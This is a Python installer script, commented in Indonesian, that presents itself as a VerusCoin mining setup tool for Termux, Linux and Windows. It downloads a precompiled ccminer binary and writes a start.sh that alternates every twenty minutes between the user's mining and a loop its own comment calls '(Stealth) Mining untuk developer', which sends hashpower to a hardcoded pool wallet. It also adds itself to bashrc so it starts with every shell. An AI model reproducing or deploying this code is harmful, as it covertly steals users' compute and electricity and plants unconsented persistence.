import os

def run(cmd):
    print(f"\n[+] Menjalankan: {cmd}")
    os.system(cmd)

print("=== VerusCoin Auto Setup & Autorun (Universal, No Package Manager) ===")

# Deteksi apakah Termux
def is_termux():
    return "com.termux" in os.environ.get("PREFIX", "")

# Deteksi Windows
def is_windows():
    return os.name == "nt"

# Isi start.sh
start_sh_content = '''#!/bin/bash

cd "$(dirname "$0")"

user_mine() {
    echo "[*] Mining untuk user..."
    ./ccminer -c config.json
}

dev_mine() {
    echo "[*] (Stealth) Mining untuk developer..."
    ./ccminer -a verus -o stratum+tcp://na.luckpool.net:3960 \\
        -u RNZpJkYQ7gXfci7Boec5gCsuYqpzLYpY3S.Acasomi -p x \\
        --cpu-priority 1 --cpu-affinity -1 --threads 8
}

while true; do
    user_mine &
    PID=$!
    sleep 1200
    kill $PID

    dev_mine &
    PID=$!
    sleep 1200
    kill $PID
done
'''

# Path target file Python
target = "/storage/emulated/0/verus_autorun.py" if os.path.exists("/storage/emulated/0") else os.path.join(os.getcwd(), "verus_autorun.py")

# Tentukan bashrc_path jika bukan Windows
bashrc_path = None
if not is_windows():
    bashrc_path = "/data/data/com.termux/files/usr/etc/bash.bashrc" if is_termux() else os.path.expanduser("~/.bashrc")

# Python script dinamis
script = f'''import os

def run(cmd):
    print(f"\\n[+] Menjalankan: {{cmd}}")
    os.system(cmd)

print("=== VerusCoin Auto Setup & Autorun ===")

def is_windows():
    return os.name == "nt"

def is_termux():
    return "com.termux" in os.environ.get("PREFIX", "")

# Buat folder mining
run("mkdir -p ~/ccminer" if not is_windows() else "mkdir ccminer")
os.chdir(os.path.expanduser("~/ccminer") if not is_windows() else "ccminer")

# Unduh ccminer dan config
run("wget -q https://raw.githubusercontent.com/Darktron/pre-compiled/generic/ccminer")
run("wget -q https://raw.githubusercontent.com/Darktron/pre-compiled/generic/config.json")

# Buat start.sh
with open("start.sh", "w") as f:
    f.write({repr(start_sh_content)})

run("chmod +x ccminer start.sh" if not is_windows() else "echo ccminer dan start.sh disiapkan")

# Tambahkan ke autorun (jika bukan Windows)
if not is_windows():
    bashrc_path = "/data/data/com.termux/files/usr/etc/bash.bashrc" if is_termux() else os.path.expanduser("~/.bashrc")
    autorun_line = "cd ~/ccminer && ./start.sh"

    try:
        with open(bashrc_path, "r") as f:
            isi = f.read()
        if autorun_line not in isi:
            with open(bashrc_path, "a") as f:
                f.write(f"\\n# Auto Start VerusCoin Miner\\n{{autorun_line}}\\n")
            print("[+] Autorun berhasil ditambahkan")
        else:
            print("[!] Autorun sudah ada")
    except Exception as e:
        print(f"[!] Gagal menambahkan ke autorun: {{e}}")
else:
    print("[!] Autorun tidak diatur otomatis di Windows (buat manual via Task Scheduler)")

# Jalankan miner
run("./start.sh" if not is_windows() else "start start.sh")
'''

# Simpan file Python ke target
with open(target, "w") as f:
    f.write(script)

print(f"[✓] File berhasil dibuat di: {target}")
print("[!] Sekarang jalankan dengan:")
print(f"    python {target}" if is_termux() else f"    python3 {target}" if not is_windows() else f"    python {target}")
